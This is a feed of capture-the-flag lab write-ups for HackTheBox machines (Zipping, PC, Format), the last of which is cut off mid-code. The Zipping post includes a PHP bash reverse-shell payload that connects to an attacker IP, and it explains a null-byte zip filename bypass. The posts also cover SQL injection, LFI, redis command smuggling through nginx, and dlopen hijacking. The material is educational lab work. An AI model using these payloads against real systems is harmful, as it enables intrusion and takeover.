<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Sat Aug 26 20:00:45 2023 as: nmap -sC -sV -oN nmap.txt -v 10.129.116.48
Increasing send delay for 10.129.116.48 from 0 to 5 due to 22 out of 73 dropped probes since last increase.
Nmap scan report for 10.129.116.48
Host is up (0.61s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 26 20:01:54 2023 -- 1 IP address (1 host up) scanned in 68.64 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Site presented itself as a <em>watch store</em>;</p>

<p><img src="/assets/img/Pasted image 20230830163349.png" alt="" /></p>

<p>No vhost seems to be in play. The <em>work with us</em> page looks interesting;</p>

<p><img src="/assets/img/Pasted image 20230830163559.png" alt="" /></p>

<p>Attempting to upload a <code class="language-plaintext highlighter-rouge">.php</code> file inside a ZIP failed;</p>

<p><img src="/assets/img/Pasted image 20230830164128.png" alt="" />
<img src="/assets/img/Pasted image 20230830164154.png" alt="" /></p>

<p>Forging HTTP headers as well as uploading a zip file with a valid PDF file along with a PHP file also failed. At this point one of my <a href="https://www.hackthebox.com/home/users/profile/174366">teammates</a> noticed that we could upload symolic links inside a zip file and achieve LFI that way as the extracted file will point to another file locally on the box;</p>

<p><img src="/assets/img/Pasted image 20230830165016.png" alt="" />
<img src="/assets/img/Pasted image 20230830165039.png" alt="" />
<img src="/assets/img/Pasted image 20230830165205.png" alt="" /></p>

<p>It seems we have access as the above user <code class="language-plaintext highlighter-rouge">rektsu</code> as I was able to read the flag by linking to <code class="language-plaintext highlighter-rouge">/home/rektsu/user.txt</code>;</p>

<p><img src="/assets/img/Pasted image 20230830165542.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>With the LFI firmly established, I started going after application code and configs. Dumping <code class="language-plaintext highlighter-rouge">../../download.php</code>, which is the file that process uploads, showed how the files are processed;</p>

<p><img src="/assets/img/Pasted image 20230830170342.png" alt="" /></p>

<p>As you can see above, the web app uses <code class="language-plaintext highlighter-rouge">ZiprArchive</code> to run some checks on the binary prior to extraction. The <code class="language-plaintext highlighter-rouge">open()</code> command loads the archive, which will help detect invalid zip files. The script then calls <code class="language-plaintext highlighter-rouge">getNameIndex(0)</code> to obtain the embedded file name of the compressed file. If this ends with <code class="language-plaintext highlighter-rouge">.pdf</code>, the program proceeds to call <code class="language-plaintext highlighter-rouge">7z</code> to extract the archive to the <code class="language-plaintext highlighter-rouge">uploads/&lt;file-hash&gt;/</code> directory.</p>

<p>With the utilities involved now known, I started running some tests locally, hoping to find a discrepancy in how <code class="language-plaintext highlighter-rouge">ZipArchive</code> and <code class="language-plaintext highlighter-rouge">7z</code> work. When you compress a file as zip, the contents of the file is embedded in the archive (usually after compression unless the file is very small). The name of the file is also stored in 2 places: before (<em>local name</em>) and after (<em>central name</em>) the embedded file data. Both <code class="language-plaintext highlighter-rouge">7z</code> and <code class="language-plaintext highlighter-rouge">ZipArchive</code> seems to be only concerned with the <em>central name</em>;</p>

<p><img src="/assets/img/Pasted image 20230830171442.png" alt="" /></p>

<p>The name highlighted red above is the central name. I started playing with this in a hex editor, and I realized that <code class="language-plaintext highlighter-rouge">7z</code> and <code class="language-plaintext highlighter-rouge">ZipArchive</code> work <strong>very differently</strong> where null bytes are concerned: <em>ZipArchive</em> <strong>DOES NOT</strong> stop reading a central filename when it encounters a null byte in it, it simply replaces it with a whitespace. <em>7z</em> on the other hand simply stops reading the filename when a null byte is encountered. This is interesting because <em>ZipArchive</em> is what the web app uses to validate the file extension of embedded files. So if we are to add a null byte to the central name just after <code class="language-plaintext highlighter-rouge">.php</code> extension but before <code class="language-plaintext highlighter-rouge">.pdf</code>, <em>ZipArchive</em> will read the complete filename and therefore see it as a <code class="language-plaintext highlighter-rouge">.pdf</code> file, while <em>7z</em> will <strong>truncate</strong> it after the null byte, and see it as a <code class="language-plaintext highlighter-rouge">.php</code> file. Since 7z is what handles the actual file extraction, this will lead to a <code class="language-plaintext highlighter-rouge">.php</code> file being created on disk.</p>

<p>To test this, I created a simple PHP payload that invokes a BASH reverse shell, and saved it as <code class="language-plaintext highlighter-rouge">payload.php0.pdf</code> (0 here is just a placeholder for easy patching);</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.26/4444 0&gt;&amp;1'"</span><span class="p">);</span> <span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I then zipped this file into <code class="language-plaintext highlighter-rouge">payload.zip</code> using;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ zip payload.zip payload.php0.pdf
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Then I opened it in a hex editor and replaced the 0 (<code class="language-plaintext highlighter-rouge">0x30</code>) with a null byte (<code class="language-plaintext highlighter-rouge">0x00</code>);</p>

<p><img src="/assets/img/Pasted image 20230830172940.png" alt="" /></p>

<p>I then uploaded it to the box and got a link ending with <code class="language-plaintext highlighter-rouge">payload.php .pdf</code>. This wonâ€™t exist since this is just the file that <em>ZipArchive</em> thought will be created, but <em>7z</em> truncated it to <code class="language-plaintext highlighter-rouge">payload.php</code>;</p>

<p><img src="/assets/img/Pasted image 20230830173355.png" alt="" />
<img src="/assets/img/Pasted image 20230830173423.png" alt="" /></p>

<p>Changing it to <code class="language-plaintext highlighter-rouge">/payload.php</code> worked, and I got a shell on the box &lt;3</p>

<p><img src="/assets/img/Pasted image 20230830173655.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <code class="language-plaintext highlighter-rouge">rektsu</code> has sudo permissions on what looks like a custom binary;</p>

<p><img src="/assets/img/Pasted image 20230830173906.png" alt="" />
<img src="/assets/img/Pasted image 20230830173940.png" alt="" /></p>

<p>The binary is asking for some password, which we do not have. So I downloaded it to my box and opened it in <em>IDA</em> for some analysis. The decompiled main function showed the program reading <strong>30</strong> bytes from standard input and passing it to <code class="language-plaintext highlighter-rouge">checkAuth()</code>;</p>

<p><img src="/assets/img/Pasted image 20230830174513.png" alt="" /></p>

<p>This is likely whatâ€™s doing the password check. Looking into it, we can see the correct password in plain text: <code class="language-plaintext highlighter-rouge">St0ckM4nager</code>;</p>

<p><img src="/assets/img/Pasted image 20230830174605.png" alt="" />
<img src="/assets/img/Pasted image 20230830174759.png" alt="" /></p>

<p>Looking further into the code, there seems to be some runtime deobfuscation going on after successful authentication. The decoded data is passed to <code class="language-plaintext highlighter-rouge">dlopen()</code>, which is used to load <em>shared object (.so)</em> files on linux;</p>

<p><img src="/assets/img/Pasted image 20230830175328.png" alt="" /></p>

<p>Since <code class="language-plaintext highlighter-rouge">dlopen()</code> expects a valid filename, we can be certain the deobfuscation was completed before this call. So a breakpoint here will be perfect. I tried to run the binary locally but was missing the required version of <code class="language-plaintext highlighter-rouge">libc</code>. However,<code class="language-plaintext highlighter-rouge">dlopen()</code> uses a system call, so we can easily pick it up with tools like <code class="language-plaintext highlighter-rouge">strace</code>, which luckily is installed on the box;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ strace stock
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/Pasted image 20230830175918.png" alt="" /></p>

<p>Looks like the binary is loading a <code class="language-plaintext highlighter-rouge">.so</code> file in our own home directory, which promises easy privesc. I used <code class="language-plaintext highlighter-rouge">msfvenom</code> to generate a <code class="language-plaintext highlighter-rouge">.so</code> meterpreter payload;</p>

<p><img src="/assets/img/Pasted image 20230830180413.png" alt="" /></p>

<p>I then setup a listener;</p>

<p><img src="/assets/img/Pasted image 20230830180607.png" alt="" /></p>

<p>Then I downloaded the payload onto the box;</p>

<p><img src="/assets/img/Pasted image 20230830180715.png" alt="" /></p>

<p>Calling the <code class="language-plaintext highlighter-rouge">stock</code> binary with sudo, I got a session as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/Pasted image 20230830181033.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP found port <strong>80</strong> and <strong>22</strong></li>
  <li>Web application provides file upload for .zip files
    <ul>
      <li>Leveraged symolic links to achieve LFI</li>
      <li>Discovered a discrepancy in how <em>ZipArchive</em> and <em>7z</em> works</li>
      <li>Exploit to upload PHP files for RCE</li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">rektsu</code>;
    <ul>
      <li>Exploited a runtime library import to gain code execution as <code class="language-plaintext highlighter-rouge">root</code></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hacthebox" /><category term="medium" /><category term="linux" /><category term="web" /><category term="zip" /><category term="file upload" /><category term="zip slip" /><category term="dlopen" /><summary type="html"><![CDATA[Zipping is a nice medium linux box on HackTheBox. It starts with exploiting a descrepancy on how gz (CLI) and ZipArchive (PHP) works to fool the web app into extracting a ZIP file containing a PHP file thinking itâ€™s a PDF. This approach turns out to be unintended, but I liked it more. Privesc to root is through dynamic import hijack with dlopen().]]></summary></entry><entry><title type="html">PC - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/pc.html" rel="alternate" type="text/html" title="PC - HackTheBox" /><published>2023-10-07T00:00:00+01:00</published><updated>2023-10-07T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/pc</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/pc.html"><![CDATA[<p><strong>PC</strong> is an easy linux machine on <em>HackTheBox</em>. It starts with exploiting an <em>SQL injection</em> vulnerability on an open RPC service to dump a user password. Once inside, you will have access to a local instance of <em>PyLoad</em> that has a pre-auth RCE CVE, which will give you access as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230831123309.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230831123333.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Tue Aug 15 23:21:43 2023 as: nmap -sC -sV -p22,50051 -v -Pn -oN nmap.txt 10.10.11.214
Nmap scan report for 10.10.11.214
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.80%I=7%D=8/15%Time=64DBFA80%P=x86_64-pc-linux-gnu%r(N
---[snip]---
SF:0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 15 23:22:09 2023 -- 1 IP address (1 host up) scanned in 25.77 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="port-50051">Port 50051</h4>
<p><br /></p>

<p>Connecting to this service using <code class="language-plaintext highlighter-rouge">netcat</code> gave a weird response;</p>

<p><img src="/assets/img/Pasted image 20230831123948.png" alt="" /></p>

<p>Googling about this port number and the response found <a href="https://github.com/grpc/grpc-node/issues/1416">something</a>;</p>

<p><img src="/assets/img/Pasted image 20230831124131.png" alt="" /></p>

<p>This identifies the service as <a href="https://grpc.io/"><strong>gRPC</strong></a>;</p>
<blockquote>
  <p>gRPC is a modern open source high performance Remote Procedure Call (RPC) framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services.</p>
</blockquote>

<p>Looking for tools to interact with it, I found <a href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9">this blog post</a>, which did a great job of explaining the protocol. I installed <a href="https://github.com/fullstorydev/grpcurl">grpcurl</a> and connect the web UI to the service;</p>

<p><img src="/assets/img/Pasted image 20230831125146.png" alt="" />
<img src="/assets/img/Pasted image 20230831125249.png" alt="" /></p>

<p>There is only 1 service and 3 methods defined;</p>

<p><img src="/assets/img/Pasted image 20230831125337.png" alt="" /></p>

<p>I created an account using the <code class="language-plaintext highlighter-rouge">RegisterUser</code> function, and was able to login;</p>

<p><img src="/assets/img/Pasted image 20230831125420.png" alt="" />
<img src="/assets/img/Pasted image 20230831125524.png" alt="" /></p>

<p>I was issued a token after login;</p>

<p><img src="/assets/img/Pasted image 20230831125622.png" alt="" /></p>

<p>Invoking <code class="language-plaintext highlighter-rouge">getInfo</code> with the token and ID;</p>

<p><img src="/assets/img/Pasted image 20230831125930.png" alt="" /></p>

<p>This is the requested generated;</p>

<p><img src="/assets/img/Pasted image 20230831130828.png" alt="" /></p>

<p>Playing with the request, I got an error message after adding a single quote to the <code class="language-plaintext highlighter-rouge">id</code> parameter;</p>

<p><img src="/assets/img/Pasted image 20230831131016.png" alt="" /></p>

<p>Giving it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, it flagged it as vulnerable, and was able to dump the database;</p>

<p><img src="/assets/img/Pasted image 20230831131613.png" alt="" />
<img src="/assets/img/Pasted image 20230831131656.png" alt="" /></p>

<p>I was able to SSH into the box using <code class="language-plaintext highlighter-rouge">sau:HereIsYourPassWord1431</code>;</p>

<p><img src="/assets/img/Pasted image 20230831131741.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">sau</code> does not have sudo perms, and is not in any group. There is some service running locally on port <strong>8000</strong>;</p>

<p><img src="/assets/img/Pasted image 20230831132016.png" alt="" /></p>

<p>I setup an SSH tunnel to it and scanned it with NMAP;</p>

<p><img src="/assets/img/Pasted image 20230831132240.png" alt="" /></p>

<p>Loading up the page;</p>

<p><img src="/assets/img/Pasted image 20230831132332.png" alt="" /></p>

<p>Trying the creds of <code class="language-plaintext highlighter-rouge">sau</code> didnâ€™t work. <code class="language-plaintext highlighter-rouge">searchsploit</code> showed it has a pre-auth RCE;</p>

<p><img src="/assets/img/Pasted image 20230831132537.png" alt="" /></p>

<p>Using the exploit, I got a shell on the box as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/Pasted image 20230831132941.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP discovered port <strong>22</strong>, and <strong>50051</strong> (gRPC)</li>
  <li>Used <code class="language-plaintext highlighter-rouge">grpcurl</code> to interact with the service;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">getInfo</code> method vulnerable to SQL injection.</li>
      <li>Used it to leak some creds from the DB, which gave me SSH access as <code class="language-plaintext highlighter-rouge">sau</code></li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">sau</code>;
    <ul>
      <li>Setup a tunnel to local <code class="language-plaintext highlighter-rouge">PyLoad</code> instance</li>
      <li>Exploit pre-auth RCE to gain a shell as <code class="language-plaintext highlighter-rouge">root</code></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hacthebox" /><category term="easy" /><category term="linux" /><category term="RPC" /><category term="gRPC" /><category term="grpcurl" /><category term="grpcui" /><category term="sql injection" /><category term="pyload" /><summary type="html"><![CDATA[PC is an easy linux machine on HackTheBox. It starts with exploiting an SQL injection vulnerability on an open RPC service to dump a user password. Once inside, you will have access to a local instance of PyLoad that has a pre-auth RCE CVE, which will give you access as root.]]></summary></entry><entry><title type="html">Format - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/format.html" rel="alternate" type="text/html" title="Format - HackTheBox" /><published>2023-09-30T00:00:00+01:00</published><updated>2023-09-30T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/format</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/format.html"><![CDATA[<p><strong>Format</strong> is a nice <em>medium</em> linux machine on <em>HackTheBox</em>. It features a custom web application for creating blogs that is vulnerable to arbitrary read and write, which is easy to detect as the full application source code is accessible in a public <em>Gitea</em> repo. Once inside, youâ€™ll be recovering some creds from the backend redis server, and exploiting a <em>format string</em> vulnerability in a python program to gain <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="format">Format</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230901194402.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230901194425.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Wed Aug 23 11:38:22 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.213
Nmap scan report for 10.10.11.213
Host is up (0.50s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
3000/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 23 11:39:36 2023 -- 1 IP address (1 host up) scanned in 73.75 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br />
A very neat looking web app for bloggers;</p>

<p><img src="/assets/img/Pasted image 20230901195129.png" alt="" /></p>

<p>Was able to register an account and login;</p>

<p><img src="/assets/img/Pasted image 20230901195253.png" alt="" /></p>

<p>Created a blog named <code class="language-plaintext highlighter-rouge">testing</code>, which interestingly spawned a new subdomain on the site;</p>

<p><img src="/assets/img/Pasted image 20230901195323.png" alt="" />
<img src="/assets/img/Pasted image 20230901195414.png" alt="" /></p>

<p>Going to the <code class="language-plaintext highlighter-rouge">edit</code> link, we were given options to add contents to the blog;</p>

<p><img src="/assets/img/Pasted image 20230901195530.png" alt="" /></p>

<p><br /></p>

<h4 id="gitea">Gitea</h4>
<p><br /></p>

<p>Port <code class="language-plaintext highlighter-rouge">3000</code> is running <em>Gitea</em>, and one public repo was found;</p>

<p><img src="/assets/img/Pasted image 20230901195745.png" alt="" /></p>

<p>This seems to contain the source code of the blogging web app, so I downloaded it for analysis;</p>

<p><img src="/assets/img/Pasted image 20230901195842.png" alt="" /></p>

<p>Nothing special was found when going through previous commits. Going through the source code, the code used to register a user account showed the application using a <em>redis</em> server as backend database via a unix socket file, and there is a user setting named <code class="language-plaintext highlighter-rouge">pro</code>, which is set to <code class="language-plaintext highlighter-rouge">false</code> by default;</p>

<p><img src="/assets/img/Pasted image 20230901200530.png" alt="" /></p>

<p>The code for creating blogs showed they are stored in <code class="language-plaintext highlighter-rouge">/var/www/microblog/</code> + the name of the blog (which is strictly lowercase alphabets, so no room for code injection);</p>

<p><img src="/assets/img/Pasted image 20230901201103.png" alt="" /></p>

<p>No part of the code made any changes to <em>Nginx</em> config, so I am guessing it is somehow configured to serve all directories in that location as subdomains.</p>

<p>Going through the code used to add contents to the blog in the edits page, it is vulnerable to <em>arbitrary write</em> as no attempt was made to validate the value of the POST parameter <code class="language-plaintext highlighter-rouge">id</code> before it was opened as a file for writing;</p>

<p><img src="/assets/img/Pasted image 20230901201553.png" alt="" /></p>

<p>I tried to exploit this and write to the PHP files, but it didnâ€™t work. This is because when creating a new blog, the template files were first made non-writable before being copied to their web directory using <code class="language-plaintext highlighter-rouge">cp -rp</code>, where the <code class="language-plaintext highlighter-rouge">p</code> preserves the permissions.</p>

<p>Notice the application is storing the <code class="language-plaintext highlighter-rouge">id</code> to a file named <code class="language-plaintext highlighter-rouge">order.txt</code>. This is the same file used by the application when building the page;</p>

<p><img src="/assets/img/Pasted image 20230901202619.png" alt="" /></p>

<p>This gives us an LFI vulnerability because even if we attempt to write to a file we canâ€™t write to, the code wonâ€™t error out, and the filename will be stored in <code class="language-plaintext highlighter-rouge">order.txt</code>, which will be loaded when building the page. Testing this by setting <code class="language-plaintext highlighter-rouge">id</code> to <code class="language-plaintext highlighter-rouge">/etc/passwd</code> during edit, it worked;</p>

<p><img src="/assets/img/Pasted image 20230901202941.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>With the LFI established, I am interested in how <em>Nginx</em> is configured in this box. Dumping the default config showed something interesting;</p>

<p><img src="/assets/img/Pasted image 20230901203912.png" alt="" /></p>

<p>Notice how the config uses parts of requested URL when routing using <code class="language-plaintext highlighter-rouge">proxy_pass</code>. For a request like <code class="language-plaintext highlighter-rouge">/static/dom/path</code>, this will resolve to <code class="language-plaintext highlighter-rouge">http://dom.microbucket.htb/path</code>.</p>

<p>We know the application is communicating with redis through a unix socket file, and that the data of each user is stored with the userâ€™s username as key in the redis server;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"username"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"password"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"first-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'first-name'</span><span class="p">]));</span>
<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"last-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'last-name'</span><span class="p">]));</span>
<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"pro"</span><span class="p">,</span> <span class="s2">"false"</span><span class="p">);</span> <span class="c1">//not ready yet, license keys coming soon</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">proxy_pass</code> command of Nginx can communicate with unix socket files using the <code class="language-plaintext highlighter-rouge">unix</code> protocol. Testing this, I was able to update my user <code class="language-plaintext highlighter-rouge">testuser</code> to <code class="language-plaintext highlighter-rouge">pro</code> by requesting the path <code class="language-plaintext highlighter-rouge">unix:/var/run/redis/redis.sock:testuser pro true /path</code>, which expands to <code class="language-plaintext highlighter-rouge">http://unix:/var/run/redis/redis.sock:testuser pro true .microbucket.htb/path</code>. Since we are still using the HTTP protocol, the request method, followed with everything after <code class="language-plaintext highlighter-rouge">redis.sock:</code> are writting to the socket;</p>

<p><img src="/assets/img/Pasted image 20230901210659.png" alt="" /></p>

<p>The above request sent <code class="language-plaintext highlighter-rouge">HSET testuser pro true</code> to our redis socket, likely with other inputs too which will simply be treated as invalid commands and ignored. This gave us <em>pro</em> access to the application;</p>

<p><img src="/assets/img/Pasted image 20230901210922.png" alt="" /></p>

<p>I now have access to the image upload feature, which creates a new <code class="language-plaintext highlighter-rouge">upload/</code> directory in the blog;</p>

<p><img src="/assets/img/Pasted image 20230901211714.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230901211728.png" alt="" /></p>

<p>The following code showed the <code class="language-plaintext highlighter-rouge">upload</code> directory is made writable when we have pro permissions;</p>

<p><img src="/assets/img/Pasted image 20230901212057.png" alt="" /></p>

<p>This means we could use the arbitrary write vulnerability discovered earlier to write PHP files into this directory. Testing this, I was able to gain code execution and a shell on the box;</p>

<p><img src="/assets/img/Pasted image 20230901212411.png" alt="" />
<img src="/assets/img/Pasted image 20230901212437.png" alt="" />
<img src="/assets/img/Pasted image 20230901212504.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p>The box has <code class="language-plaintext highlighter-rouge">redis-cli</code> installed, so I used it to explore the redis server. I got a password;</p>

<p><img src="/assets/img/Pasted image 20230901212848.png" alt="" /></p>

<p>There is a local user named <code class="language-plaintext highlighter-rouge">cooper</code> on the box, so I tried login into his account, and it worked;</p>

<p><img src="/assets/img/Pasted image 20230901212949.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">cooper</code> is not part of any special group, but he does have a sudo permission on a custom python script;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>cooper@format:~$ sudo -l
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
cooper@format:~$ file /usr/bin/license 
/usr/bin/license: Python script, ASCII text executable
cooper@format:~$ ~
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">hashes</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.kdf.pbkdf2</span> <span class="kn">import</span> <span class="n">PBKDF2HMAC</span>
<span class="kn">from</span> <span class="nn">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">date</span>
